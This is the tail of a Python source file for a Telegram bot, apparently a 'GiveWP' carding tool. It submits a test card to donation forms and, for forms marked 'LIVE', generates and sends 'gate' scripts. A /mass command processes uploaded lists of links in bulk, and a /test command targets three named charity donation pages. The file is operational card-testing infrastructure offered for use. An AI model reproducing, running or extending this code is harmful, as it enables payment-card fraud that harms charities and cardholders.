def cb_fb(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="back"))
    try: bot.edit_message_text("💬 Send message:", call.message.chat.id, call.message.message_id, reply_markup=kb)
    except: pass
    waiting_users[call.from_user.id] = True


@bot.callback_query_handler(func=lambda c: c.data == "back")
def cb_back(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
    kb.add(types.InlineKeyboardButton("💬 Feedback", callback_data="fb"))
    try: bot.edit_message_text("<b>⚡ Bot</b>\n\n/start", call.message.chat.id, call.message.message_id, reply_markup=kb)
    except: pass


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users and not (m.text or "").startswith("/"))
def handle_fb(msg):
    waiting_users.pop(msg.from_user.id, None)
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"r_{msg.from_user.id}"))
    safe_send(OWNER_ID, f"📩 {msg.from_user.first_name} ({msg.from_user.id}):\n{msg.text[:500]}", kb)
    safe_send(msg.chat.id, "✅ Sent!")


@bot.callback_query_handler(func=lambda c: c.data.startswith("r_"))
def cb_reply(call):
    uid = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = uid
    try: bot.answer_callback_query(call.id)
    except: pass
    safe_send(call.from_user.id, "Write reply:")


@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def handle_reply(msg):
    uid = reply_mode.pop(msg.from_user.id, None)
    if uid:
        safe_send(uid, f"<b>Admin:</b>\n{msg.text}")
        safe_send(msg.from_user.id, "✅")


@bot.message_handler(commands=["paypal"])
def paypal_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫"); return
    parts = (msg.text or "").split(maxsplit=1)
    if len(parts) != 2:
        safe_send(msg.chat.id, "❌ /paypal URL"); return
    url = parts[1].strip()
    if not url.startswith(("http://","https://")):
        safe_send(msg.chat.id, "❌ Bad URL"); return
    sm = safe_send(msg.chat.id, f"🔍 Scanning...\n<code>{url[:80]}</code>")
    if not sm: return
    def run():
        t0 = time.time()
        try:
            r = check(url, TEST_CARD)
            dt = time.time() - t0
            st, code, raw = r["status"], r["code"], r.get("raw","")
            dbg = r.get("debug",{})
            if st == "LIVE":
                gate = gen_gate(url, dbg, TEST_CARD)
                host = urlparse(url).netloc.replace(".","_")
                fn = f"gate_{host}_{int(time.time())}.py"
                safe_doc(msg.chat.id, gate.encode(), fn, f"✅ {fn}")
                info = dbg.get("extracted",{})
                report = f"""✅ <b>Gate Extracted!</b>
━━━━━━━━━━━━━━━━━
[⚡] Domain: <code>{urlparse(url).netloc}</code>
[⚡] Form: <code>{info.get("form2","?")}</code>
[⚡] Amount: <code>${dbg.get("amount","?")}</code>
[⚡] Platform: <code>{dbg.get("platform","?")}</code>
━━━━━━━━━━━━━━━━━
🧪 Card: <code>{TEST_CARD[:10]}****</code>
[⚡] Response: <code>{code}</code>
[⚡] Time: <code>{dt:.1f}s</code>"""
                safe_edit(msg.chat.id, sm.message_id, report)
            else:
                txt = f"❌ <b>{st}</b> | <code>{code}</code>\n🔗 <code>{url[:80]}</code>\n⏱️ {dt:.1f}s"
                if raw: txt += f"\n📝 <code>{raw[:300]}</code>"
                safe_edit(msg.chat.id, sm.message_id, txt)
        except Exception as e:
            safe_edit(msg.chat.id, sm.message_id, f"❌ {str(e)[:200]}")
    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["test"])
def test_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫"); return
    sites = [
        ("dandelions","https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"),
        ("stychno","https://www.stychnohumanitarianfoundation.com/donations/donation-form/"),
        ("svdp","https://svdpvenicefl.org/donations/donations/"),
    ]
    sm = safe_send(msg.chat.id, f"🔍 {len(sites)} sites...")
    if not sm: return
    def run():
        res = []
        for n, u in sites:
            safe_edit(msg.chat.id, sm.message_id, f"🔍 {n}... ({len(res)}/{len(sites)})")
            r = check(u, TEST_CARD)
            res.append((n, r["status"], r["code"]))
        txt = "<b>📊 Results:</b>\n\n"
        for n, s, c in res:
            txt += f"{'✅' if s=='LIVE' else '❌'} <b>{n}</b>: {c}\n"
        safe_edit(msg.chat.id, sm.message_id, txt)
    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["mass"])
def mass_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫"); return
    sm = safe_send(msg.chat.id, "📁 Send .txt file")
    if sm: bot.register_next_step_handler(sm, handle_mass)


def handle_mass(msg):
    if not msg.document:
        safe_send(msg.chat.id, "❌ Not a file"); return
    try:
        fi = bot.get_file(msg.document.file_id)
        data = bot.download_file(fi.file_path)
        links = [l.strip() for l in data.decode("utf-8",errors="ignore").splitlines() if l.strip()]
        if not links:
            safe_send(msg.chat.id, "❌ Empty"); return
        uid = msg.from_user.id; chat = msg.chat.id; total = len(links)
        processing_status[uid] = {"stop":False,"done":False,"live":0,"dead":0,
                                   "current":"","total":total,"processed":0}
        sm = safe_send(chat, f"📊 {total} links...")
        if not sm: return
        def updater():
            last = ""
            while True:
                time.sleep(8)
                try:
                    if processing_status[uid]["done"]: break
                    st = processing_status[uid]
                    pct = int(st["processed"]/total*100) if total else 0
                    bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                    txt = f"📊 {st['processed']}/{total} ✅{st['live']} ❌{st['dead']}\n{pct}% {bar}\n<code>{st['current'][:60]}</code>"
                    if txt != last:
                        try: bot.edit_message_text(txt, chat, sm.message_id); last = txt
                        except: pass
                except: pass
        threading.Thread(target=updater, daemon=True).start()
        def worker():
            for link in links:
                if processing_status[uid].get("stop"): break
                processing_status[uid]["current"] = link
                try:
                    r = check(link, TEST_CARD)
                    processing_status[uid]["processed"] += 1
                    if r["status"] == "LIVE":
                        processing_status[uid]["live"] += 1
                        gate = gen_gate(link, r.get("debug",{}), TEST_CARD)
                        host = urlparse(link).netloc.replace(".","_")
                        fn = f"gate_{host}_{int(time.time())}.py"
                        safe_doc(chat, gate.encode(), fn, f"✅ {link[:60]}")
                    else:
                        processing_status[uid]["dead"] += 1
                except: pass
            processing_status[uid]["done"] = True
            st = processing_status[uid]
            safe_edit(chat, sm.message_id, f"📊 Done! ✅{st['live']} ❌{st['dead']}/{total}")
        threading.Thread(target=worker, daemon=True).start()
    except Exception as e:
        safe_send(msg.chat.id, f"❌ {str(e)[:100]}")


@bot.message_handler(commands=["stop"])
def stop_cmd(msg):
    if msg.from_user.id in processing_status:
        processing_status[msg.from_user.id]["stop"] = True
        safe_send(msg.chat.id, "🛑")
    else:
        safe_send(msg.chat.id, "❌ No active")


@bot.message_handler(commands=["block2"])
def block_cmd(msg):
    if str(msg.from_user.id) not in ADMINS:
        safe_send(msg.chat.id, "🚫"); return
    try:
        uid = msg.text.split()[1]
        with open("blockusers.txt","a") as f: f.write(f"{uid}\n")
        safe_send(msg.chat.id, f"✅ Blocked {uid}")
    except: safe_send(msg.chat.id, "Usage: /block2 ID")


@bot.message_handler(commands=["unblock2"])
def unblock_cmd(msg):
    if str(msg.from_user.id) not in ADMINS:
        safe_send(msg.chat.id, "🚫"); return
    try:
        uid = msg.text.split()[1]
        with open("blockusers.txt") as f: lines = f.readlines()
        with open("blockusers.txt","w") as f:
            for l in lines:
                if l.strip() != uid: f.write(l)
        safe_send(msg.chat.id, f"✅ Unblocked {uid}")
    except: safe_send(msg.chat.id, "Usage: /unblock2 ID")


if __name__ == "__main__":
    print("🔥 GiveWP Bot v29 — Playwright Only")
    print(f"Playwright: {'✅' if HAS_PW else '❌'}")
    if not HAS_PW:
        print("❌ Install: pip install playwright && playwright install chromium")
        sys.exit(1)
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
        except KeyboardInterrupt:
            print("⏹️"); break
        except Exception as e:
            err = str(e)
            if "409" in err or "Conflict" in err:
                print("⚠️ 409 — 15s"); time.sleep(15); continue
            print(f"❌ {err[:100]}"); time.sleep(5)
